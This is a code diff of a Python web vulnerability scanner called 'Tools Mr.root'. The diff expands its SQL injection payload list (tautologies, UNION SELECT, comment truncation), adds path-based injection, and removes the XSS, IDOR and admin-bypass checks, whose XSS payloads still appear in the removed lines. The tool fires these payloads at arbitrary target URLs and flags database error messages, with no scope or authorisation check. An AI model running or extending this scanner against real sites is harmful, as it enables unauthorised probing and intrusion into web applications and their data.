@@ -24,7 +24,7 @@ def show_tool_name():
     tool_name = pyfiglet.figlet_format("Tools Mr.root")
     print(colored(tool_name, "green"))
 
-# Modify URL to inject payloads into parameters
+# Inject payload into URL
 def inject_payload(url, param, payload):
     parsed_url = urlparse(url)
     query_params = parse_qs(parsed_url.query)
@@ -36,70 +36,35 @@ def inject_payload(url, param, payload):
 
 # Scan for SQL Injection vulnerabilities
 def scan_sql_injection(url):
-    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "admin' --", "' UNION SELECT null, null --"]
+    sql_payloads = [
+        "'", "\"", "1' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT null --",
+        "' AND 1=2 UNION SELECT null --", "' OR '1'='1' --", "admin'--", "1 OR 1=1"
+    ]
+
     parsed_url = urlparse(url)
     query_params = parse_qs(parsed_url.query)
     
-    for param in query_params:
-        for payload in payloads:
-            vulnerable_url = inject_payload(url, param, payload)
-            try:
-                response = requests.get(vulnerable_url, timeout=5).text
-                if "error" in response.lower() or "sql" in response.lower():
-                    confirm_response = requests.get(vulnerable_url, timeout=5).text
-                    if "error" in confirm_response.lower() or "sql" in confirm_response.lower():
-                        return True, vulnerable_url
-            except Exception:
-                continue
-    return False, None
+    if not query_params:  # Check if there are no query parameters, assume path-based injection
+        test_urls = [url + payload for payload in sql_payloads]
+    else:
+        test_urls = [
+            inject_payload(url, param, payload) 
+            for param in query_params 
+            for payload in sql_payloads
+        ]
 
-# Scan for XSS vulnerabilities
-def scan_xss(url):
-    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'';!--\"<XSS>=&{()}"]
-    parsed_url = urlparse(url)
-    query_params = parse_qs(parsed_url.query)
-    
-    for param in query_params:
-        for payload in payloads:
-            vulnerable_url = inject_payload(url, param, payload)
-            try:
-                response = requests.get(vulnerable_url, timeout=5).text
-                if payload in response:
-                    confirm_response = requests.get(vulnerable_url, timeout=5).text
-                    if payload in confirm_response:
-                        return True, vulnerable_url
-            except Exception:
-                continue
-    return False, None
-
-# Scan for IDOR vulnerabilities
-def scan_idor(url):
-    sensitive_paths = ["/user/1", "/user/2", "/account/1001", "/account/1002"]
-    for path in sensitive_paths:
-        test_url = f"{url}{path}"
+    for test_url in test_urls:
         try:
-            response = requests.get(test_url, timeout=5).text
-            if "unauthorized" not in response.lower() and "not found" not in response.lower():
-                confirm_response = requests.get(test_url, timeout=5).text
-                if "unauthorized" not in confirm_response.lower() and "not found" not in confirm_response.lower():
-                    return True, test_url
-        except Exception:
+            response = requests.get(test_url, timeout=5)
+            if response.status_code == 200 and (
+                "sql" in response.text.lower() or 
+                "syntax error" in response.text.lower() or
+                "database" in response.text.lower()
+            ):
+                return True, test_url
+        except Exception as e:
             continue
-    return False, None
 
-# Scan for Admin Bypass vulnerabilities
-def scan_bypass_admin(url):
-    paths = ["/admin", "/admin/dashboard", "/admin/panel"]
-    for path in paths:
-        test_url = f"{url}{path}"
-        try:
-            response = requests.get(test_url, timeout=5).text
-            if "welcome admin" in response.lower() or "admin panel" in response.lower():
-                confirm_response = requests.get(test_url, timeout=5).text
-                if "welcome admin" in confirm_response.lower() or "admin panel" in confirm_response.lower():
-                    return True, test_url
-        except Exception:
-            continue
     return False, None
 
 # Main program
@@ -137,27 +102,6 @@ def main():
         if sql_injection:
             results_table.add_row([colored(url, "green"), "SQL Injection", sql_path])
             print(colored(f"[+] Found SQL Injection: {sql_path}", "green"))
-            found = True
-
-        # XSS
-        xss, xss_path = scan_xss(url)
-        if xss:
-            results_table.add_row([colored(url, "green"), "XSS", xss_path])
-            print(colored(f"[+] Found XSS: {xss_path}", "green"))
-            found = True
-
-        # IDOR
-        idor, idor_path = scan_idor(url)
-        if idor:
-            results_table.add_row([colored(url, "green"), "IDOR", idor_path])
-            print(colored(f"[+] Found IDOR: {idor_path}", "green"))
-            found = True
-
-        # Admin Bypass
-        bypass, bypass_path = scan_bypass_admin(url)
-        if bypass:
-            results_table.add_row([colored(url, "green"), "Admin Bypass", bypass_path])
-            print(colored(f"[+] Found Admin Bypass: {bypass_path}", "green"))
             found = True
 
         if not found:
